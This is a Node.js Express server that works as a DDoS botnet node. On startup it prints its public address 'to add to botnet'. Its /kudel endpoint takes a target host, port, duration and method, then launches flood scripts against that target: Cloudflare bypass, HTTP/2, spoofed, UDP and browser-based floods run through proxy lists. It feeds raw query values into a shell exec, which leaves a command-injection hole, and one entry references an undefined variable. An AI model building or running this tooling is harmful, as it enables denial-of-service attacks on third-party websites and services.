const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
return data
}

app.get('/kudel', (req, res) => {
  const { host, port, time, methods } = req.query;
  
  if (!host || !port  || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters'
    });
  }

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  const attackMethods = {
    'HTTP-BYPASS': `./lib/cache/HTTP_BYPASS.js ${host} ${time} 30 1 proxy.txt`,
    'CF-BYPASS': `./lib/cache/CF_BYPASS.js ${host} ${time} 1 proxy.txt 30 captcha`,
    'HTTP-NULL': `./lib/cache/HTTP_NULL.js ${host} ${time} 1 30`,
    'HTTP2': `./lib/cache/HTTP2.js ${host} ${time} 30 1 proxy.txt http2`,
    'HTTP-RAW': `./lib/cache/HTTP_RAW.js ${host} ${time} 30 1 proxy.txt`,
    'SPOOF': `./lib/cache/SPOOF.js ${host} ${time} 30 1 proxy.txt`,
    'FLOOD-QUERYSTRING': `./lib/cache/FLOOD_QUERYSTRING.js ${host} proxy.txt ${time} GET 4`,
    'SAXIOS-FLOW': `./lib/cache/SAXIOS_FLOW.js ${host} ${time} 10 4 proxy.txt flood`,
    'BROWSER': `./lib/cache/browser-based-flood.js ${host} ${time} 30 1 proxy.txt`,
    'APACHE': `./lib/cache/APACHE.js ${target} ${time} 30 1 proxy.txt`,
    'UDP': `./lib/cache/udp.js ${host} ${port} ${time} 40`
  };
  

  const selectedMethod = attackMethods[methods];
  
  if (selectedMethod) {
    if (Array.isArray(selectedMethod)) {
      selectedMethod.forEach(script => {
        exec(`node ${script}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`Execution error: ${error}`);
            return;
          }
          console.log(`Executed: ${script}`);
        });
      });
    } else {
      exec(`node ${selectedMethod}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Execution error: ${error}`);
          return;
        }
        console.log(`Executed: ${selectedMethod}`);
      });
    }
  } else {
    console.log(`Unsupported method: ${methods}`);
  }
});
app.listen(port, () => {
fetchData()
});